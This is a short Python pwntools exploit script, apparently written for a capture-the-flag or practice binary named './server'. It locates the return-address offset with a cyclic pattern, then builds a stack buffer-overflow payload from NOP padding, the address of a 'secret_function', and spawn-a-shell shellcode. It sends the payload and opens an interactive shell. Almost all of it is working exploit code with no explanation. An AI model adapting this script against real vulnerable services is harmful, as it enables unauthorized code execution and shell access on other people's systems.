from pwn import *

exe='./server'

def find_ip(payload):
    p=process(exe)
    p.sendlineafter(b':',payload)
    p.wait()
    offset=cyclic_find(p.corefile.pc)
    return offset

elf=context.binary=ELF(exe)

#offset=find_ip(cyclic(200))

offset=76

payload=flat(
    asm('nop')*76,
    elf.functions.secret_function,
    asm(shellcraft.sh())
)

io=process(exe)

io.sendlineafter(b':',payload)
io.interactive()